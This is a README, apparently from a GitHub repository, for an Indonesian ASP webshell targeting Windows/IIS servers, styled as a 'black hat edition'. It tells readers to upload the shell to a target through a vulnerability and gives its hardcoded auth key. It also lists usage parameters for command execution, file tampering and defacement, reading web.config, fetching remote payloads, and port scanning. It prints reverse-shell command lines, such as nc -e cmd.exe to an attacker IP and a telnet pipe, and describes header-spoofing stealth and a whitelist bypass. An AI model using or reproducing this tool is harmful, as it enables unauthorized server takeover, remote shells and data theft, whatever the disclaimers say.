# 🐍 SERPENTECHUNTER v1.0 – ASP ULTIMATE WEBSHELL

**Ultimate ASP WebShell for Windows/IIS Security Testing & Penetration Testing**

![ASP](https://img.shields.io/badge/ASP-VBScript-blueviolet?style=flat-square&logo=windows)
![Version](https://img.shields.io/badge/version-1.0-brightgreen?style=flat-square)
![Developer](https://img.shields.io/badge/Developer-SerpentSecHunter-orange?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-red?style=flat-square)
![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20IIS-blue?style=flat-square)

---

## 📌 Tentang

**SERPENTECHUNTER v1.0** adalah WebShell ASP (VBScript) canggih yang dirancang untuk **security testing** dan **penetration testing** pada server **Windows/IIS**. Shell ini menggabungkan berbagai fitur dari WebShell ASP terkenal seperti **r57 ASP**, **b374k ASP**, dan **AspWebShell**, dengan tambahan fitur modern seperti **bypass komponen**, **wildcard IP whitelist**, dan **multi-method reverse shell**.

> ⚠️ **Disclaimer:** Tools ini hanya untuk tujuan edukasi dan pengujian keamanan yang sah (authorized penetration testing). Penggunaan untuk aktivitas ilegal adalah tanggung jawab pengguna sepenuhnya.

---

## 🔥 Fitur Unggulan

| Fitur | Deskripsi |
|-------|-----------|
| **🛡️ Stealth Engine** | Bypass 403/404 dengan spoofing header (`Server`, `X-Powered-By`) dan error handling |
| **🔐 Authentication** | Multi-layer auth (Cookie + IP Whitelist Wildcard/CIDR + GET Parameter) |
| **🧬 Command Execution** | 3 strategi: `WScript.Shell`, `Shell.Application`, `WMI (Win32_Process)` |
| **💀 Command Execution** | Eksekusi perintah sistem dengan fallback otomatis |
| **📁 File Manager Ultimate** | List, Read, Write, Delete, Rename, Chmod (via `attrib`), Search (recursive) |
| **📤 Upload & Download** | Upload via POST form (multipart/form-data), Download local file, Remote Download via HTTP (MSXML2/WinHttp) |
| **🌐 Reverse Shell** | 3 metode sekaligus (PowerShell, Netcat, Telnet) - dijalankan di background |
| **🔍 Port Scanner** | TCP Connect scanner dengan multi-format port support (XMLHTTP + Winsock fallback) |
| **🗄️ Database Client** | Support MSSQL (SQLNCLI11) dan Microsoft Access (Jet OLEDB) |
| **🎨 UI Responsive** | Tampilan blackhat theme yang mobile-friendly |
| **🔑 Wildcard IP** | Support IP whitelist dengan wildcard (`%`) dan CIDR (`/24`) |

---

## 📸 Tampilan

```
🐍 SERPENTECHUNTER v1.0
🔥 ULTIMATE ASP WEBSHELL – BLACK HAT EDITION 🔥
👑 DEVELOPER: SerpentSecHunter | 📅 RILIS: 02-07-2026

🛡️ MODE: KILL MODE | 🚀 STATUS: ACTIVE | 👑 USER: SerpentSecHunter
📍 PATH: C:\inetpub\wwwroot

🔧 BYPASS: WScript.Shell | Shell.Application | WMI | 403/404 BYPASS | WILDCARD IP
```

---

## 🚀 Cara Penggunaan

### 1. Upload Shell
Upload file `Shell.asp` ke server target melalui vulnerability (File Upload, RCE, dll) pada server **Windows dengan IIS**.

### 2. Akses & Login
```bash
http://target.com/path/Shell.asp?auth=SERPENTECHUNTER666
```

Setelah login, cookie akan tersimpan selama 1 tahun.

### 3. Parameter & Perintah

| Parameter | Fungsi | Contoh |
|-----------|--------|--------|
| `action=exec` | Execute command | `?action=exec&cmd=whoami` |
| `action=file` | File Manager | `?action=file&cmd=list&target=C:\` |
| `action=reverse` | Reverse Shell | `?action=reverse&ip=1.2.3.4&port=4444` |
| `action=portscan` | Port Scanner | `?action=portscan&host=127.0.0.1&ports=1-100` |
| `action=db` | Database Client | `?action=db&dbtype=mssql&dbserver=localhost&dbname=master&dbuser=sa&dbpass=pass` |
| `action=upload` | Upload File (POST) | `?action=upload&path=C:\temp` (gunakan form) |
| `action=download` | Download File | `?action=download&path=C:\file.txt` |
| `action=remotedownload` | Remote Download | `?action=remotedownload&url=http://x.com/p.exe&savepath=C:\p.exe` |

### 4. Bypass IP Whitelist
Jika IP Anda tidak terdaftar di whitelist, gunakan:
```bash
?bypass_ip=1
```

---

## 📂 File Manager

```bash
# List directory
?action=file&cmd=list&target=C:\inetpub\wwwroot

# Read file
?action=file&cmd=read&target=C:\windows\win.ini

# Write file
?action=file&cmd=write&target=C:\inetpub\wwwroot\test.txt&content=HACKED

# Delete file/folder (recursive)
?action=file&cmd=delete&target=C:\inetpub\wwwroot\test.txt

# Rename
?action=file&cmd=rename&target=C:\old.txt&params[new_name]=C:\new.txt

# Search files (recursive)
?action=file&cmd=search&target=C:\inetpub\wwwroot&params[pattern]=config

# Chmod (attrib via cmd)
?action=file&cmd=chmod&target=C:\file.txt&params[perms]=+H
```

---

## 🌐 Reverse Shell

Shell ini menjalankan **3 metode reverse shell sekaligus** di background!

### Persiapan Listener (di komputer attacker):
```bash
# Untuk PowerShell/Netcat
nc -lvnp 4444

# Untuk Telnet (port kedua)
nc -lvnp 4445
```

### Eksekusi Reverse Shell:
```bash
?action=reverse&ip=1.2.3.4&port=4444
```

### Metode yang Didukung:
| Metode | Command | Port |
|--------|---------|------|
| **PowerShell** | `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "... "` | `port` |
| **Netcat** | `nc -e cmd.exe 1.2.3.4 4444` | `port` |
| **Telnet** | `telnet 1.2.3.4 4444 \| cmd \| telnet 1.2.3.4 4445` | `port` & `port+1` |

> ⚡ Semua metode berjalan di background (`WScript.Shell.Run` dengan `0`), sehingga tidak membuat halaman hang!

---

## 🔍 Port Scanner

Support multi-format port input:
```bash
# Range port
?action=portscan&host=127.0.0.1&ports=1-100

# Multiple port
?action=portscan&host=127.0.0.1&ports=22,80,443

# Kombinasi
?action=portscan&host=127.0.0.1&ports=1-100,443,8080
```

**Metode Scanning:**
1. **XMLHTTP** → deteksi port terbuka via HTTP request (cepat)
2. **Winsock (fallback)** → TCP Connect (jika XMLHTTP gagal)

---

## 🗄️ Database Client

Support 2 jenis database di Windows:

### MSSQL (SQL Server)
```bash
?action=db&dbtype=mssql&dbserver=localhost&dbname=master&dbuser=sa&dbpass=password
```
Menggunakan provider `SQLNCLI11` (SQL Server Native Client).

### Microsoft Access
```bash
?action=db&dbtype=access&dbserver=C:\database.mdb
```
Menggunakan provider `Microsoft.Jet.OLEDB.4.0`.

---

## 🛡️ Bypass & Stealth

### 1. Command Execution (3 Strategi)
| Strategi | Objek | Deskripsi |
|----------|-------|-----------|
| **1** | `WScript.Shell` | `.Exec()` method - paling stabil, output lengkap |
| **2** | `Shell.Application` | `.ShellExecute()` - fallback jika WScript.Shell diblokir |
| **3** | `WMI` | `Win32_Process.Create()` - paling stealth, susah dideteksi |

### 2. Stealth Engine
```vbscript
Response.Status = "200"
Response.AddHeader "Server", "Microsoft-IIS/8.5"
Response.AddHeader "X-Powered-By", "ASP.NET"
```
- Menyembunyikan identitas server asli.
- Menghilangkan error log yang mencurigakan.

### 3. IP Whitelist (Wildcard + CIDR)
```vbscript
whitelist = Array("127.0.0.1", "::1", "192.168.1.%", "10.0.0.0/8")
```
- Support wildcard `%` untuk subnet (contoh: `192.168.1.%`).
- Support CIDR `/24` sampai `/8`.

---

## 🔑 Authentication

### Metode Authentication:
1. **Cookie** → `sc_auth` (plaintext AUTH_KEY)
2. **GET Parameter** → `?auth=SERPENTECHUNTER666`
3. **IP Whitelist** → Support wildcard (`%`) dan CIDR (`/24`)
4. **Bypass IP** → `?bypass_ip=1`

### Ubah AUTH_KEY:
```vbscript
AUTH_KEY = "YOUR_CUSTOM_KEY_HERE"
```

### Tambah IP Whitelist:
```vbscript
whitelist = Array("127.0.0.1", "::1", "192.168.1.%", "10.0.0.0/8")
```

---

## 📁 Upload & Download

### Upload File (via Form)
Gunakan form upload yang tersedia di UI shell.

**Endpoint:** `?action=upload&path=C:\target\folder` (metode POST)

### Download Local File
```bash
?action=download&path=C:\inetpub\wwwroot\web.config
```

### Remote Download (via HTTP)
```bash
?action=remotedownload&url=http://example.com/payload.exe&savepath=C:\temp\payload.exe
```
**Fallback:** Jika `MSXML2.ServerXMLHTTP` tidak tersedia, otomatis beralih ke `WinHttp.WinHttpRequest.5.1`.

---

## 🔧 Instalasi

```bash
# Clone repository
git clone https://github.com/SerpentSecHunter2006/WEB-SHELL-ASP.git

# Upload Shell.asp ke target server (IIS/Windows)
# Akses via browser
http://target.com/path/Shell.asp?auth=SERPENTECHUNTER666
```

---

## 📝 Changelog

### v1.0 (02-07-2026)
- ✅ Initial release – ASP Ultimate Webshell
- ✅ Command Execution (3 strategi: WScript.Shell, Shell.Application, WMI)
- ✅ File Manager (List/Read/Write/Delete/Rename/Search/Chmod)
- ✅ Upload & Download (Local + Remote)
- ✅ Reverse Shell (PowerShell + Netcat + Telnet)
- ✅ Port Scanner (XMLHTTP + Winsock fallback)
- ✅ Database Client (MSSQL + Access)
- ✅ IP Whitelist (Wildcard `%` + CIDR `/24`)
- ✅ Stealth Engine (Header Spoofing)
- ✅ UI Responsive & Mobile Friendly
- ✅ Fully functional on Windows/IIS

---

## 🛠️ Teknologi

- **VBScript** (Classic ASP)
- **HTML5 + CSS3** (Responsive UI)
- **IIS** (Microsoft Internet Information Services)
- **Komponen:** `WScript.Shell`, `Shell.Application`, `FileSystemObject`, `ADODB.Stream`, `MSXML2.ServerXMLHTTP`, `WinHttp.WinHttpRequest`, `ADODB.Connection`

---

## ⚖️ Lisensi

**MIT License** - Silakan gunakan, modifikasi, dan distribusikan dengan mencantumkan kredit kepada developer.

```
MIT License

Copyright (c) 2026 SerpentSecHunter

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:
...
```

---

## 👨‍💻 Developer

**SerpentSecHunter**  
- GitHub: [SerpentSecHunter2006](https://github.com/SerpentSecHunter2006)  
- Rilis: 02-07-2026  

---

## ⭐ Support

Jika Anda menyukai project ini, berikan **star** ⭐ di GitHub dan **fork** untuk mendukung pengembangan lebih lanjut!

---

## ⚠️ Disclaimer

> **Peringatan:** Tools ini dibuat untuk tujuan **edukasi** dan **pengujian keamanan** yang sah (authorized penetration testing). Penggunaan tools ini untuk aktivitas ilegal, hacking tanpa izin, atau merusak sistem orang lain adalah **TINDAKAN PIDANA** dan sepenuhnya menjadi **tanggung jawab pengguna**. Developer tidak bertanggung jawab atas penyalahgunaan tools ini.

---

**🐍 SERPENTECHUNTER v1.0 – "TIDAK ADA YANG GAK BISA!"** 😈

**📌 Repository Lain:** [WEB-SHELL (PHP Version)](https://github.com/SerpentSecHunter2006/WEB-SHELL)
```
](https://img.shields.io/badge/ASP-VBScript-blueviolet?style=flat-square&logo=windows)
